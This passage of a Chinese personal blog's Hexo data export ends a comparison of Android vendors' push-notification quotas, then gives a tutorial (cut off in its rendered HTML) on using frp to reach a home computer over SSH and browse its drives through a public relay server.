href=\"https://open.oppomobile.com/wiki/doc#id=11210\">OPPO开放平台</a></li>\n<li><a href=\"https://dev.vivo.com.cn/documentCenter/doc/359#_Toc64906673\">vivo开放平台</a></li>\n</ul>\n<h3 id=\"关于Apple\"><a href=\"#关于Apple\" class=\"headerlink\" title=\"关于Apple\"></a>关于Apple</h3><p>我也看了一下Apple的推送服务文档，并没有提到相关的限制，所以我这里没有做相关分析，也许要开发者帐号才能查看？欢迎熟悉这方面业务的同学评论。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover_type":"img","excerpt":"","more":"<blockquote>\n<p> 先说句题外话，又过了这么多年了，没想到国内Android的统一推送还是没有实现。</p>\n</blockquote>\n<p>由于工作需要，最近正好在调研各家系统推送服务，我发现从他们的技术文档可以分析出很多有意思的东西，比如说能看出来哪家厂商的推送限制最严格，最考虑用户的综合体验。在讲解之前，我们先简单提几个推送服务的基本概念：</p>\n<ul>\n<li>设备：用户所持有的某台设备，在技术文档中所提到的日活跃用户数一般也就指日联网设备数</li>\n<li>应用：某台设备上安装的某个应用，后续我们所描述的推送数量限制都是以此维度比较的</li>\n<li>推送：应用进程活跃或关闭时，通过系统级的推送通道下发消息，一般以通知消息的形式呈现给用户，点击后激活应用进程</li>\n<li>透传：仅在应用活跃时可接收数据，仍然依赖系统的推送服务器下发，但数据格式一般可以自定义，处理逻辑也是由应用自己实现，所以应用如果被杀死，自然就处理不到了</li>\n</ul>\n<p>一个不那么规范的示意图：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/4e5fce56c25947ecb2b67d3ecf168b47.png\" alt=\"在这里插入图片描述\"></p>\n<p><strong>注：下文以x表示日联网设备数量；我们主要关注推送，不过多说明透传的限制。</strong></p>\n<h3 id=\"各家次数限制\"><a href=\"#各家次数限制\" class=\"headerlink\" title=\"各家次数限制\"></a>各家次数限制</h3><h4 id=\"华为\"><a href=\"#华为\" class=\"headerlink\" title=\"华为\"></a>华为</h4><p>对于某设备某应用，推送和透传次数总共不超过<strong>3000次&#x2F;每日</strong>；相当于该应用每日推送总量上限为：<code>f(x) = 3000 * x</code></p>\n<p>简要解读：华为严格限制了某设备某应用所能接收的推送数量，所以对于某应用而言，推送总量和设备数量线性相关。</p>\n<h4 id=\"小米\"><a href=\"#小米\" class=\"headerlink\" title=\"小米\"></a>小米</h4><p>透传没有数量限制，而推送分为<strong>普通级别</strong>和<strong>重要级别</strong>，重要级别的消息（比如即时通讯消息、个人订单状态变化等）没有数量限制，但需要单独向小米团队申请。下面只说明普通级别的消息：</p>\n<p>对于某应用，推送总量上限为<strong>x的数倍&#x2F;每日</strong>，这个倍数和你的应用分类有关，比如新闻资讯是5倍，时尚购物是2倍，我们以最低的2倍为例，该应用每日推送总量上限为：</p>\n<ul>\n<li>当x &lt; 10000时，<code>f(x) = 2 * 10000 = 20000</code></li>\n<li>当x &gt;&#x3D; 10000时，<code>f(x) = 2 * x</code></li>\n</ul>\n<p>简要解读：从小米推送的官方文档来看，和华为不同，并没有明确限制某设备某应用接收的数量，只限制了某应用对于所有设备的推送总量，换言之，极端情况下，我可以把这个额度全部推给某一台设备。所以你的用户少到一定程度时，单台设备可接收的推送数量会远大于华为的3000次限制。当然，这种极端情况其实属于一种漏洞了，虽然文档确实没有说明，但估计是不可行的。</p>\n<h4 id=\"OPPO\"><a href=\"#OPPO\" class=\"headerlink\" title=\"OPPO\"></a>OPPO</h4><p>不支持透传，推送分为<strong>公信</strong>和<strong>私信</strong>，私信类似小米的重要级别消息，不限量，需要单独申请。下面只说明公信：</p>\n<p>对于某应用，推送总量上限为<strong>2x&#x2F;每日</strong>，该应用每日推送总量上限为：</p>\n<ul>\n<li>当x &lt; 50000时，<code>f(x) = 2 * 50000 = 100000</code></li>\n<li>当x &gt;&#x3D; 50000时，<code>f(x) = 2 * x</code></li>\n</ul>\n<p>对于某设备，公信和私信总和接收数上限为<strong>2000&#x2F;每日</strong>。</p>\n<p>简要解读：OPPO的规则和小米非常类似，但没有像小米那样按应用分类给不同的倍数，而是固定为2倍。且对于某设备，无论公信还是私信，每日接收推送的总和上限为2000，也就是说该设备无论有多少个应用接入了OPPO推送，其每日接收总量固定。所以即便你申请了私信总量无限，但单一用户仍然有限。</p>\n<h4 id=\"vivo\"><a href=\"#vivo\" class=\"headerlink\" title=\"vivo\"></a>vivo</h4><p>不支持透传，推送分为<strong>运营消息</strong>和<strong>系统消息</strong>，类似小米和OPPO，但又不尽相同，vivo的系统消息默认是可以直接使用的，不向小米和OPPO那样需要申请，只不过每日推送总量限制与运营消息相同，为<strong>x的1倍</strong>。系统消息虽然在文档中声称<strong>不限制某设备某应用的接收数量</strong>，但实际上有总量限制，所以某一台设备接收最大数也就是总量，如果需要增量再向官方申请（但至于可以申请多少，肯定也不是无限的）。下面只说明运营消息：</p>\n<p>对于某应用，推送总量上限为<strong>x&#x2F;每日</strong>，该应用每日推送总量上限为：</p>\n<ul>\n<li>当x &lt; 10000时，<code>f(x) = 10000</code></li>\n<li>当x &gt;&#x3D; 10000时，<code>f(x) = x</code></li>\n</ul>\n<p>对于某设备某应用，运营消息接收数上限为<strong>5&#x2F;每日</strong>，系统消息则为<strong>无限&#x2F;每日</strong>。</p>\n<p>简单解读：vivo的限制规则和其他家有很大不同，对于某设备某应用的普通运营消息做了很严格的控制，每天仅为5条，因此该设备当天总接收量取决于所安装的集成了vivo系统推送的应用数，这和OPPO直接限制成2000&#x2F;每日有些许差异。</p>\n<h3 id=\"横向对比\"><a href=\"#横向对比\" class=\"headerlink\" title=\"横向对比\"></a>横向对比</h3><p>在分析完上述各家推送的文档之后，我们从两个角度来进行对比。</p>\n<h4 id=\"从开发者角度\"><a href=\"#从开发者角度\" class=\"headerlink\" title=\"从开发者角度\"></a>从开发者角度</h4><p>作为应用开发者，我们比较关心的是每天总共可以推送多少消息出去，将上文函数绘制出来就非常清楚了：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/bad73233601542c4b7fd74125153a8be.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>在单个应用每天可推送总量这个指标上看，华为对应函数的斜率是3000，可谓是一骑绝尘，给到普通开发者的资源也算非常慷慨的了。然后再单独看其他三家吧：</p>\n<ul>\n<li>当设备数小于1万时，可推送总量：OPPO &gt; 小米 &gt; vivo。</li>\n<li>当设备数介于1万到5万之间时，可推送总量依然是：OPPO &gt; 小米 &gt; vivo，但小米与vivo的差距随着设备数增多而增大；</li>\n<li>当设备数大于5万时，可推送总量：OPPO &#x3D; 小米 &gt; vivo，此时OPPO和小米已经一致，并与vivo的差距越来越大。</li>\n</ul>\n<p>因此对开发者来说，总体上可推送数量对比：华为 &gt; OPPO &gt; 小米 &gt; vivo。<del>没错，产品运营同学们可以对华为用户加大营销力度了。</del></p>\n<h4 id=\"从用户角度\"><a href=\"#从用户角度\" class=\"headerlink\" title=\"从用户角度\"></a>从用户角度</h4><p>刚刚提到的总量其实并不是用户最关心的，由于各家厂商的规则各异，我们更关心的是<strong>某设备每天能收到的推送数量上限</strong>。</p>\n<p>因此我们<strong>以y表示某设备所安装的应用数</strong>（接入了对应系统推送的），得出如下函数：</p>\n<ul>\n<li>华为：<code>f(y) = 3000 * y</code></li>\n<li>小米：由于其官方文档并没有对设备维度作说明，只能按平均值计算，所以是<code>f(y) = (2 + 5) / 2 * y = 3.5 * y</code>，2和5分别为上文提到的不同应用分类限制倍数的最小值和最大值，其实更为合理的是按所安装应用类型的分布来计算。</li>\n<li>OPPO：与安装应用数量无关，<code>f(y) = 2000</code></li>\n<li>vivo：<code>f(y) = 5 * y</code></li>\n</ul>\n<p><img src=\"https://imgconvert.csdnimg.cn/bc8747ae84f048958bff82a0db5e0865.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>由图可知，对用户来讲，不同厂商推送对所安装应用数量的敏感度是不一样的，每天能收到的推送数量上限情况如下：</p>\n<ul>\n<li>当安装应用数量小于400时，华为 &gt; OPPO &gt; vivo &gt; 小米</li>\n<li>当安装应用数量介于400到（约）571时，华为 &gt; vivo &gt; OPPO &gt; 小米</li>\n<li>当安装应用数量大于（约）571时，华为 &gt; vivo &gt; 小米 &gt; OPPO</li>\n</ul>\n<p>总体看来，华为依然是一骑绝尘，不管你安装多少应用，收到的推送数量都是最多的，换言之，也是理论上用户体验最不好的。从函数图像上来看，结合实际情况（一般人不会安装超过400个应用）vivo和小米推送是管控相对较为严格的，理论上用户体验最佳。OPPO相对而言比较简单粗暴，这对于轻度用户来说不是很友好。</p>\n<p>上述结论是完全基于官方文档的说明来进行的数据分析，它更多是表明了对于开发者和用户的可影响程度。在实际体验中，几家厂商并没有太大差异，最终影响用户设备接收推送体验的因素也非常复杂，可能应用的开发者针对不同用户也有不同频次的推送，也可能用户有自己的应用设置习惯，所以每个人的感受也千差万别。此外，即便开发者不对用户体验负责，厂商的推送平台还是会对大家负责的，毕竟任何异常量级的数据都会受到风控的，而且对于滥用推送的开发者，平台也会有相应的处罚机制。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://dev.mi.com/console/doc/detail?pId=2086\">小米文档中心</a></li>\n<li><a href=\"https://developer.huawei.com/consumer/cn/doc/development/HMSCore-Guides/faq-0000001050042183#section196822541234\">华为推送服务</a></li>\n<li><a href=\"https://open.oppomobile.com/wiki/doc#id=11210\">OPPO开放平台</a></li>\n<li><a href=\"https://dev.vivo.com.cn/documentCenter/doc/359#_Toc64906673\">vivo开放平台</a></li>\n</ul>\n<h3 id=\"关于Apple\"><a href=\"#关于Apple\" class=\"headerlink\" title=\"关于Apple\"></a>关于Apple</h3><p>我也看了一下Apple的推送服务文档，并没有提到相关的限制，所以我这里没有做相关分析，也许要开发者帐号才能查看？欢迎熟悉这方面业务的同学评论。</p>\n"},{"layout":"post","title":"简单几步实现内网穿透","subtitle":"摸鱼吗？","date":"2022-05-19T16:00:00.000Z","author":"YSY","header-style":"text","catalog":true,"cover":"https://cdn.sspai.com/2022/05/17/db42d70e69013af8c4944a5fc1225e3b.png","_content":"\n### 场景\n\n为了避免阐述过多理论，我们直接从需求场景入手，来了解一下为什么需要内网穿透？\n\n> 小明是少数派的一位咕咕作者，在家里电脑稿某文稿了一半，到公司后打算摸鱼继续稿，怎么办呢（此处假定他没有使用任何云同步软件，也不会使用git，就算会用他也忘了提交）？\n>\n> 此时，小明想通过ssh等远程访问设备文件的方式来下载家里那半稿子，但他的家庭网络是没有分配公网IP的，无法通过互联网直连。内网穿透就这样派上用场了。\n\n所以通俗地讲，内网穿透就是要将流量从公网穿透到内网，让内网设备也能通过公网访问，帮助小明在公司访问家里电脑的文件。\n\n### 设施\n\n内网穿透的核心思想就是“映射”和“转发”，把内网设备的端口映射到公网设备的端口上，来进行流量转发。\n\n![image-20220517161146780](https://cdn.sspai.com/2022/05/17/db42d70e69013af8c4944a5fc1225e3b.png)\n\n简单地画一下示意图如上，基础设施由两个核心设备组成：\n\n服务端：拥有公网IP的设备一台，即上图“公网服务器”，开放2个端口7000和6000，用于公网通信。\n\n客户端：要访问的内网设备一台，即上图\"内网家用电脑\"，开放实际应用服务所需的端口（比如ssh服务，默认22端口），并将配置的公网映射端口6000告知服务端。所以服务端开放的那个端口6000实际上是客户端告诉它的。\n\n*（以上端口除22以外均为自定义端口，无特殊含义。）*\n\n基础设施搭建好以后，小明在公司通过ssh远程访问自家电脑的命令便如下：\n\n```bash\n# 假定服务器公网IP是119.23.141.248，内网家用电脑用户名是test\nssh -oPort=6000 test@119.23.141.248\n```\n\n这就是我们想达到内网穿透的预期效果——表面上看，家庭内网的电脑就像拥有了公网IP一样暴露在互联网中。\n\n### 实现\n\n要实现这种基础的内网穿透，一般是以一台带公网IP的服务器作为中转（暂不讨论点对点的）。开源世界中已经有很多较为成熟的工具，接下来就直接以[frp](https://github.com/fatedier/frp)为例，简单几步部署就可以搞定啦！\n\n#### 安装\n\n先在官方发布仓库下载对应包，几种常用架构：\n\n- 比如服务端一般是Linux（Intel 64位CPU）：[frp_0.42.0_linux_amd64.tar.gz](https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_linux_amd64.tar.gz)\n- 客户端一般是Windows（Intel 64位CPU）：[frp_0.42.0_windows_amd64.zip](https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_windows_amd64.zip)\n- 或macOS（Intel芯片）：[frp_0.42.0_darwin_amd64.tar.gz](https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_darwin_amd64.tar.gz)；M1芯片：[frp_0.42.0_darwin_arm64.tar.gz](https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_darwin_arm64.tar.gz)\n\n如果GitHub访问困难，可以从我的网盘下载：[frp-v0.4.2](https://pan.baidu.com/s/1BUb9pDITZLPHATGYaYVefw?pwd=c655)\n\n**解压**后会发现里面既有`frps`也有`frpc`（Windows版本的可执行程序是exe），前者表示Server（服务端），后者表示Client（客户端），对应同名配置文件`frps.ini`和`frpc.ini`，对于某一端只会用到其中一套程序。\n\n#### 配置\n\n这里参考[官方文档](https://gofrp.org/docs/examples/ssh/)介绍两种比较实用的配置，ssh服务和文件访问服务。\n\n**一、通过 SSH 访问内网机器**\n\n解压对应架构的包到服务端，并修改frps.ini文件，设置端口7000，当然你可以自定义为任意端口，只要不和系统上已有端口冲突即可：\n\n```bash\n[common]\nbind_port = 7000\n```\n\n启动服务端frp（-c参数表示config）：\n\n```bash\n./frps -c ./frps.ini\n```\n\n同理，解压包到客户端，并修改frpc.ini文件，在common标签下填入公网服务器的IP和端口（对应服务端设置的端口）。然后设置好ssh服务的远程端口6000即可（local_ip和port一般不用改）。\n\n```bash\n[common]\nserver_addr = x.x.x.x\nserver_port = 7000\n\n[ssh]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 22\nremote_port = 6000\n```\n\n启动客户端frp：\n\n```bash\n./frpc -c ./frpc.ini\n```\n\n不出意外的话，客户端的终端会提示你登录服务端成功。\n\n然后在任意一个设备上即可通过公网访问内网设备（即客户端frp所在的那台）：\n\n```bash\nssh -oPort=6000 你的系统登录用户名@x.x.x.x\n```\n\n**二、对外提供简单的文件访问服务**\n\n如果我们想通过浏览器直接访问内网设备上的文件，就这样配置客户端（此处以Windows为例），不用改服务端：\n\n```bash\n[common]\nserver_addr = x.x.x.x\nserver_port = 7000\n\n[ssh]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 22\nremote_port = 6000\n\n[c_static_file]\ntype = tcp\nremote_port = 6001\nplugin = static_file\nplugin_local_path = C:\nplugin_strip_prefix = driver_c\nplugin_http_user = 自定义名称，这个和系统登录的用户名不是一个东西，随便写就行\nplugin_http_passwd = 自定义密码\n\n[d_static_file]\ntype = tcp\nremote_port = 6002\nplugin = static_file\nplugin_local_path = D:\nplugin_strip_prefix = driver_d\nplugin_http_user = 自定义名称，同上\nplugin_http_passwd = 自定义密码\n```\n\n我们在上文已配置好ssh的基础上，追加两个文件访问配置c_static_file和d_static_file，这两个标签名字也是自定义的；static_file是文件访问服务的客户端插件名称，这个是固定的；`plugin_local_path = C:`表示可访问整个C盘，对应下面的是D盘；driver_c和driver_d这两个前缀也是自定义的，便于等会儿在浏览器访问。\n\n修改配置文件后，重新启动客户端frp：\n\n```bash\nfrpc.exe -c frpc.ini\n```\n\n启动成功后，就可以在浏览器直接访问啦：**http://x.x.x.x:6001/driver_c/** ，访问的时候提示你输入用户名和密码就是上面配置的plugin_http_user和passwd。\n\n*（不容易注意到的小坑：地址末尾的斜杠/必须填，否则访问不了）*\n\n### 末了\n\n在测试的时候，我的公网服务器是在腾讯云上，默认有防火墙规则，所以要记得在后台配置放开相应的端口访问（比如上述的7000和6000）。另外，文中有个小彩蛋，不知道有没有人发现哈哈！\n","source":"_posts/2022-05-20-简单几步实现内网穿透.md","raw":"---\nlayout:     post\ntitle:      简单几步实现内网穿透\nsubtitle:   摸鱼吗？\ndate:       2022-05-20\nauthor:     YSY\nheader-style: text\ncatalog: true\ncover: https://cdn.sspai.com/2022/05/17/db42d70e69013af8c4944a5fc1225e3b.png\ntags:\n    - 鼓捣折腾\n---\n\n### 场景\n\n为了避免阐述过多理论，我们直接从需求场景入手，来了解一下为什么需要内网穿透？\n\n> 小明是少数派的一位咕咕作者，在家里电脑稿某文稿了一半，到公司后打算摸鱼继续稿，怎么办呢（此处假定他没有使用任何云同步软件，也不会使用git，就算会用他也忘了提交）？\n>\n> 此时，小明想通过ssh等远程访问设备文件的方式来下载家里那半稿子，但他的家庭网络是没有分配公网IP的，无法通过互联网直连。内网穿透就这样派上用场了。\n\n所以通俗地讲，内网穿透就是要将流量从公网穿透到内网，让内网设备也能通过公网访问，帮助小明在公司访问家里电脑的文件。\n\n### 设施\n\n内网穿透的核心思想就是“映射”和“转发”，把内网设备的端口映射到公网设备的端口上，来进行流量转发。\n\n![image-20220517161146780](https://cdn.sspai.com/2022/05/17/db42d70e69013af8c4944a5fc1225e3b.png)\n\n简单地画一下示意图如上，基础设施由两个核心设备组成：\n\n服务端：拥有公网IP的设备一台，即上图“公网服务器”，开放2个端口7000和6000，用于公网通信。\n\n客户端：要访问的内网设备一台，即上图\"内网家用电脑\"，开放实际应用服务所需的端口（比如ssh服务，默认22端口），并将配置的公网映射端口6000告知服务端。所以服务端开放的那个端口6000实际上是客户端告诉它的。\n\n*（以上端口除22以外均为自定义端口，无特殊含义。）*\n\n基础设施搭建好以后，小明在公司通过ssh远程访问自家电脑的命令便如下：\n\n```bash\n# 假定服务器公网IP是119.23.141.248，内网家用电脑用户名是test\nssh -oPort=6000 test@119.23.141.248\n```\n\n这就是我们想达到内网穿透的预期效果——表面上看，家庭内网的电脑就像拥有了公网IP一样暴露在互联网中。\n\n### 实现\n\n要实现这种基础的内网穿透，一般是以一台带公网IP的服务器作为中转（暂不讨论点对点的）。开源世界中已经有很多较为成熟的工具，接下来就直接以[frp](https://github.com/fatedier/frp)为例，简单几步部署就可以搞定啦！\n\n#### 安装\n\n先在官方发布仓库下载对应包，几种常用架构：\n\n- 比如服务端一般是Linux（Intel 64位CPU）：[frp_0.42.0_linux_amd64.tar.gz](https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_linux_amd64.tar.gz)\n- 客户端一般是Windows（Intel 64位CPU）：[frp_0.42.0_windows_amd64.zip](https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_windows_amd64.zip)\n- 或macOS（Intel芯片）：[frp_0.42.0_darwin_amd64.tar.gz](https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_darwin_amd64.tar.gz)；M1芯片：[frp_0.42.0_darwin_arm64.tar.gz](https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_darwin_arm64.tar.gz)\n\n如果GitHub访问困难，可以从我的网盘下载：[frp-v0.4.2](https://pan.baidu.com/s/1BUb9pDITZLPHATGYaYVefw?pwd=c655)\n\n**解压**后会发现里面既有`frps`也有`frpc`（Windows版本的可执行程序是exe），前者表示Server（服务端），后者表示Client（客户端），对应同名配置文件`frps.ini`和`frpc.ini`，对于某一端只会用到其中一套程序。\n\n#### 配置\n\n这里参考[官方文档](https://gofrp.org/docs/examples/ssh/)介绍两种比较实用的配置，ssh服务和文件访问服务。\n\n**一、通过 SSH 访问内网机器**\n\n解压对应架构的包到服务端，并修改frps.ini文件，设置端口7000，当然你可以自定义为任意端口，只要不和系统上已有端口冲突即可：\n\n```bash\n[common]\nbind_port = 7000\n```\n\n启动服务端frp（-c参数表示config）：\n\n```bash\n./frps -c ./frps.ini\n```\n\n同理，解压包到客户端，并修改frpc.ini文件，在common标签下填入公网服务器的IP和端口（对应服务端设置的端口）。然后设置好ssh服务的远程端口6000即可（local_ip和port一般不用改）。\n\n```bash\n[common]\nserver_addr = x.x.x.x\nserver_port = 7000\n\n[ssh]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 22\nremote_port = 6000\n```\n\n启动客户端frp：\n\n```bash\n./frpc -c ./frpc.ini\n```\n\n不出意外的话，客户端的终端会提示你登录服务端成功。\n\n然后在任意一个设备上即可通过公网访问内网设备（即客户端frp所在的那台）：\n\n```bash\nssh -oPort=6000 你的系统登录用户名@x.x.x.x\n```\n\n**二、对外提供简单的文件访问服务**\n\n如果我们想通过浏览器直接访问内网设备上的文件，就这样配置客户端（此处以Windows为例），不用改服务端：\n\n```bash\n[common]\nserver_addr = x.x.x.x\nserver_port = 7000\n\n[ssh]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 22\nremote_port = 6000\n\n[c_static_file]\ntype = tcp\nremote_port = 6001\nplugin = static_file\nplugin_local_path = C:\nplugin_strip_prefix = driver_c\nplugin_http_user = 自定义名称，这个和系统登录的用户名不是一个东西，随便写就行\nplugin_http_passwd = 自定义密码\n\n[d_static_file]\ntype = tcp\nremote_port = 6002\nplugin = static_file\nplugin_local_path = D:\nplugin_strip_prefix = driver_d\nplugin_http_user = 自定义名称，同上\nplugin_http_passwd = 自定义密码\n```\n\n我们在上文已配置好ssh的基础上，追加两个文件访问配置c_static_file和d_static_file，这两个标签名字也是自定义的；static_file是文件访问服务的客户端插件名称，这个是固定的；`plugin_local_path = C:`表示可访问整个C盘，对应下面的是D盘；driver_c和driver_d这两个前缀也是自定义的，便于等会儿在浏览器访问。\n\n修改配置文件后，重新启动客户端frp：\n\n```bash\nfrpc.exe -c frpc.ini\n```\n\n启动成功后，就可以在浏览器直接访问啦：**http://x.x.x.x:6001/driver_c/** ，访问的时候提示你输入用户名和密码就是上面配置的plugin_http_user和passwd。\n\n*（不容易注意到的小坑：地址末尾的斜杠/必须填，否则访问不了）*\n\n### 末了\n\n在测试的时候，我的公网服务器是在腾讯云上，默认有防火墙规则，所以要记得在后台配置放开相应的端口访问（比如上述的7000和6000）。另外，文中有个小彩蛋，不知道有没有人发现哈哈！\n","slug":"简单几步实现内网穿透","published":1,"updated":"2024-03-25T07:31:25.988Z","comments":1,"photos":[],"link":"","_id":"cluaufh1l004wthe60zpf1ja6","content":"<h3 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h3><p>为了避免阐述过多理论，我们直接从需求场景入手，来了解一下为什么需要内网穿透？</p>\n<blockquote>\n<p>小明是少数派的一位咕咕作者，在家里电脑稿某文稿了一半，到公司后打算摸鱼继续稿，怎么办呢（此处假定他没有使用任何云同步软件，也不会使用git，就算会用他也忘了提交）？</p>\n<p>此时，小明想通过ssh等远程访问设备文件的方式来下载家里那半稿子，但他的家庭网络是没有分配公网IP的，无法通过互联网直连。内网穿透就这样派上用场了。</p>\n</blockquote>\n<p>所以通俗地讲，内网穿透就是要将流量从公网穿透到内网，让内网设备也能通过公网访问，帮助小明在公司访问家里电脑的文件。</p>\n<h3 id=\"设施\"><a href=\"#设施\" class=\"headerlink\" title=\"设施\"></a>设施</h3><p>内网穿透的核心思想就是“映射”和“转发”，把内网设备的端口映射到公网设备的端口上，来进行流量转发。</p>\n<p><img src=\"https://cdn.sspai.com/2022/05/17/db42d70e69013af8c4944a5fc1225e3b.png\" alt=\"image-20220517161146780\"></p>\n<p>简单地画一下示意图如上，基础设施由两个核心设备组成：</p>\n<p>服务端：拥有公网IP的设备一台，即上图“公网服务器”，开放2个端口7000和6000，用于公网通信。</p>\n<p>客户端：要访问的内网设备一台，即上图”内网家用电脑”，开放实际应用服务所需的端口（比如ssh服务，默认22端口），并将配置的公网映射端口6000告知服务端。所以服务端开放的那个端口6000实际上是客户端告诉它的。</p>\n<p><em>（以上端口除22以外均为自定义端口，无特殊含义。）</em></p>\n<p>基础设施搭建好以后，小明在公司通过ssh远程访问自家电脑的命令便如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 假定服务器公网IP是119.23.141.248，内网家用电脑用户名是test</span></span><br><span class=\"line\">ssh -oPort=6000 <span class=\"built_in\">test</span>@119.23.141.248</span><br></pre></td></tr></table></figure>\n\n<p>这就是我们想达到内网穿透的预期效果——表面上看，家庭内网的电脑就像拥有了公网IP一样暴露在互联网中。</p>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>要实现这种基础的内网穿透，一般是以一台带公网IP的服务器作为中转（暂不讨论点对点的）。开源世界中已经有很多较为成熟的工具，接下来就直接以<a href=\"https://github.com/fatedier/frp\">frp</a>为例，简单几步部署就可以搞定啦！</p>\n<h4 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h4><p>先在官方发布仓库下载对应包，几种常用架构：</p>\n<ul>\n<li>比如服务端一般是Linux（Intel 64位CPU）：<a href=\"https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_linux_amd64.tar.gz\">frp_0.42.0_linux_amd64.tar.gz</a></li>\n<li>客户端一般是Windows（Intel 64位CPU）：<a href=\"https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_windows_amd64.zip\">frp_0.42.0_windows_amd64.zip</a></li>\n<li>或macOS（Intel芯片）：<a href=\"https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_darwin_amd64.tar.gz\">frp_0.42.0_darwin_amd64.tar.gz</a>；M1芯片：<a href=\"https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_darwin_arm64.tar.gz\">frp_0.42.0_darwin_arm64.tar.gz</a></li>\n</ul>\n<p>如果GitHub访问困难，可以从我的网盘下载：<a href=\"https://pan.baidu.com/s/1BUb9pDITZLPHATGYaYVefw?pwd=c655\">frp-v0.4.2</a></p>\n<p><strong>解压</strong>后会发现里面既有<code>frps</code>也有<code>frpc</code>（Windows版本的可执行程序是exe），前者表示Server（服务端），后者表示Client（客户端），对应同名配置文件<code>frps.ini</code>和<code>frpc.ini</code>，对于某一端只会用到其中一套程序。</p>\n<h4 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h4><p>这里参考<a href=\"https://gofrp.org/docs/examples/ssh/\">官方文档</a>介绍两种比较实用的配置，ssh服务和文件访问服务。</p>\n<p><strong>一、通过 SSH 访问内网机器</strong></p>\n<p>解压对应架构的包到服务端，并修改frps.ini文件，设置端口7000，当然你可以自定义为任意端口，只要不和系统上已有端口冲突即可：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">bind_port = 7000</span><br></pre></td></tr></table></figure>\n\n<p>启动服务端frp（-c参数表示config）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>\n\n<p>同理，解压包到客户端，并修改frpc.ini文件，在common标签下填入公网服务器的IP和端口（对应服务端设置的端口）。然后设置好ssh服务的远程端口6000即可（local_ip和port一般不用改）。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">server_addr = x.x.x.x</span><br><span class=\"line\">server_port = 7000</span><br><span class=\"line\"></span><br><span class=\"line\">[ssh]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\">remote_port = 6000</span><br></pre></td></tr></table></figure>\n\n<p>启动客户端frp：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>\n\n<p>不出意外的话，客户端的终端会提示你登录服务端成功。</p>\n<p>然后在任意一个设备上即可通过公网访问内网设备（即客户端frp所在的那台）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -oPort=6000 你的系统登录用户名@x.x.x.x</span><br></pre></td></tr></table></figure>\n\n<p><strong>二、对外提供简单的文件访问服务</strong></p>\n<p>如果我们想通过浏览器直接访问内网设备上的文件，就这样配置客户端（此处以Windows为例），不用改服务端：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 